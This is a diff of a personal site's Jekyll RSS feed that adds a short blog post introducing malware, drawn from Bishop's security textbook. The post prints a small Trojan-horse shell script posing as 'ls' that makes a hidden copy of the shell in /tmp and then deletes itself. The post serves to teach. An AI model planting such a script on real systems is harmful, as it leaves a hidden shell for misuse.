@@ -5,9 +5,47 @@
     <description>Personal website, blogs and other updates</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 06 Jan 2020 01:02:35 +0530</pubDate>
-    <lastBuildDate>Mon, 06 Jan 2020 01:02:35 +0530</lastBuildDate>
+    <pubDate>Thu, 09 Jan 2020 13:31:54 +0530</pubDate>
+    <lastBuildDate>Thu, 09 Jan 2020 13:31:54 +0530</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Gentle introduction to Malicious Software or Malware</title>
+        <description>&lt;h3 id=&quot;definition-&quot;&gt;Definition &lt;sup id=&quot;fnref:fn1&quot;&gt;&lt;a href=&quot;#fn:fn1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h3&gt;
+
+&lt;p&gt;Malicious logic, more commonly called malware, is a set of instructions that cause a site’s security policy to be violated.&lt;/p&gt;
+
+&lt;p&gt;Following is a demonstration of a malicious code in Unix based systems&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#! /bin/sh 
+
+# make a privileged, hidden copy of the shell (command interpreter) 
+cp /bin/sh /tmp/.xxsh 
+chmod o+s, w+x /tmp/.xxsh
+
+# do what the victim thinks is *all* you’re doing 
+ls $* 
+
+# delete this file 
+rm ./ls
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;references&quot;&gt;References:&lt;/h3&gt;
+
+&lt;div class=&quot;footnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:fn1&quot;&gt;
+      &lt;p&gt;Computer Security - Arts and Science, &lt;em&gt;Matt Bishop&lt;/em&gt; (Ch23 of 2nd Edition) &lt;a href=&quot;#fnref:fn1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Thu, 09 Jan 2020 00:00:00 +0530</pubDate>
+        <link>http://localhost:4000/security/2020/01/09/malware-intro.html</link>
+        <guid isPermaLink="true">http://localhost:4000/security/2020/01/09/malware-intro.html</guid>
+        
+        
+        <category>security</category>
+        
+      </item>
     
       <item>
         <title>Introduction to dynamic realtime plotting with Plotly/Dash</title>
